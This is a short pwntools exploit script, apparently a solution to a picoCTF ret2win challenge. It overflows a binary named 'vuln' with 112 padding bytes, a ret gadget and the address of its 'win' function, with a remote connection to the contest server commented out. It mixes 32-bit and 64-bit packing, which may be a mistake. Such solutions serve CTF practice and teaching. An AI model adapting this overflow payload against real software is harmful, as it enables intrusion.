#!/usr/bin/python3

from pwn import *

elf = ELF('vuln')

io = process('./vuln')

#io = remote('saturn.picoctf.net' ,57558)

ret = 0x08049009
payload = cyclic(112) + pack(ret) + p64(elf.sym.win)   

io.sendline(payload)

io.interactive()
